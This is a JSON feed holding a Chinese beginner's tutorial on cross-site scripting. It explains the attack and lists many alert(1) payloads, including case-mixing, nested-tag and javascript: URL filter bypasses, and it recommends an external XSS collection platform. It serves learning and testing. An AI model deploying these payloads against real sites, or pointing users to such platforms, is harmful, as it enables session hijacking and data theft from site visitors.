{
    "version": "https://jsonfeed.org/version/1",
    "title": "Or0kit • All posts by \"xss\" tag",
    "description": "临渊羡鱼，不如退而结网",
    "home_page_url": "https://Or0kit.github.io",
    "items": [
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/%E5%88%9D%E5%AD%A6XSS/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/%E5%88%9D%E5%AD%A6XSS/",
            "title": "初学XSS",
            "date_published": "2020-12-09T02:18:02.000Z",
            "content_html": "<h1 id=\"xss简介\"><a class=\"anchor\" href=\"#xss简介\">#</a> XSS 简介</h1>\n<p>XSS 攻击指黑客通过特殊的手段往网页中插入了恶意的 JavaScript 脚本，从而在用户浏览网页时，对用户浏览器发起 Cookie 资料窃取、会话劫持、钓鱼欺骗等各攻击。</p>\n<p>XSS 跨站脚本攻击本身对 Web 服务器没有直接危害，它借助网站进行传播，使网站的大量用户受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意 URL，当受害者在 Web 浏览器中打开该 URL 的时侯，恶意脚本会在受害者的计算机上悄悄执行。</p>\n<p>XSS 跨站脚本攻击漏洞也是 OWASP Top 10 中经常出现的对象，造成 XSS 漏洞普遍流行的原因如下:</p>\n<ol>\n<li>Web 浏览器本身的设计不安全，无法判断 JS 代码是否是恶意的</li>\n<li>输入与输出的 Web 应用程序基本交互防护不够</li>\n<li>程序员缺乏安全意识，缺少对 XSS 漏洞的认知</li>\n<li>XSS 触发简单，完全防御起来相当困难</li>\n</ol>\n<h1 id=\"小知识\"><a class=\"anchor\" href=\"#小知识\">#</a> 小知识</h1>\n<ol>\n<li>XSS 的存在，一定是伴随着输入，与输出 2 个概念的。</li>\n<li>要想过滤掉 XSS，你可以在输入层面过滤，也可以在输出层面过滤。</li>\n<li>如果输入和输出都没过滤。那么漏洞将是显而易见的。</li>\n</ol>\n<hr />\n<p>css 里，允许使用转义字符，\\+ascii16 进制形式。这样一来，我们就可以构造利用语句啦。</p>\n<hr />\n<p>在 HTML 属性中，会自动对实体字符进行转义。一个简单的比方。<br />\n&lt;imgsrc=&quot;1&quot;onerror=&quot;alert(1)&quot;&gt;<br />\n 和<br />\n &lt;imgsrc=&quot;1&quot;onerror=&quot;alert (1)&quot;&gt;<br />\n 是等效的</p>\n<hr />\n<h1 id=\"常见的payload\"><a class=\"anchor\" href=\"#常见的payload\">#</a> 常见的 payload</h1>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token string\">\">&lt;script>alert(1)&lt;/script>&lt;\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token string\">'>&lt;script>alert(1)&lt;/script>&lt;'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token string\">\">&lt;script>alert(1)&lt;/script>&lt;\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token string\">\">&lt;ScrIPt>alert(1)&lt;/scriPt>&lt;\"</span> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token string\">\">&lt;ScrIPt>alert(1)&lt;/scriPt>&lt;\"</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token string\">\">&lt;scriscriptpt>alert(1)&lt;/scscriptriPt>&lt;\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token string\">\">&lt;scriscriptpt>alert(1)&lt;/scscriptriPt>&lt;\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token string\">\">&lt;Script>alert(1)&lt;/Script>&lt;\"</span> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token string\">\">&lt;img src=x ONerror=alert(1)>&lt;\"</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token string\">\">&lt;a onclick=alert(1)>click me&lt;/a>&lt;\"</span>  <span class=\"token comment\">// 不过这个需要点击一下才能 xss，危害没有自动 xss 效果好</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token string\">\">&lt;a href=\"</span>javascript<span class=\"token operator\">:</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token string\">\">click me&lt;/a>&lt;\"</span>   <span class=\"token comment\">// 这里 href 里使用 javascript 伪协议声明后面的是 js 代码</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token string\">\">&lt;body onload=alert(1)>&lt;\"</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token string\">\">&lt;div onclick=\"</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">'xss'</span><span class=\"token punctuation\">)</span><span class=\"token string\">\">click me&lt;\"</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token string\">\">&lt;body onload=alert`1`>&lt;\"</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">// 有时候用斜杠是可以代替空格的</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token string\">\">&lt;img/src='1'/onerror=alert`0`>&lt;\"</span> </pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token string\">\">&lt;&lt;svg/onload=alert`1`>&lt;\"</span>  </pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">//input 是有一个比较奇葩的 payload 的，那就是 </span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span>image src<span class=\"token operator\">=</span>x onerror<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span> </pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">// 这个 payload 会把 input 当做 img 标签来用</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">// 对单双引号进行了替换，替换为了对应的实体编码</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">// 然后判断了用户提交的 url 中是否含有 http://</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">// 用来验证提交的是否为 url</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">// 这里可以用 </span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>javascript<span class=\"token operator\">:</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//http://</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\">// 因为 javascript 中，// 是代表注释的意思</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\">// 这样数据中含有 http:// 还不影响弹窗</span></pre></td></tr></table></figure><h1 id=\"xss平台\"><a class=\"anchor\" href=\"#xss平台\">#</a> XSS 平台</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94cy5zYi94c3MucGhw\">https://xs.sb/xss.php</span></p>\n<p>这个挺不错的。</p>\n",
            "tags": [
                "xss"
            ]
        }
    ]
}